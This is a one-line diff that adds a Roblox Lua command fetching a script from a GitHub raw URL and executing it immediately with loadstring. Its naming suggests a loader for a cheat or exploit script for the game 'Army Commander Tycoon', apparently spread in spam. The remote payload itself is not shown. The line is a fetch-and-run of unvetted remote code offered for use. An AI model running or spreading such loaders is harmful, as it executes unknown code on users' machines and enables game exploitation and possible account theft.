@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/army-commander-tycoon-update-4-spam7-b7gx5p3vo7mzvv.lua"))()
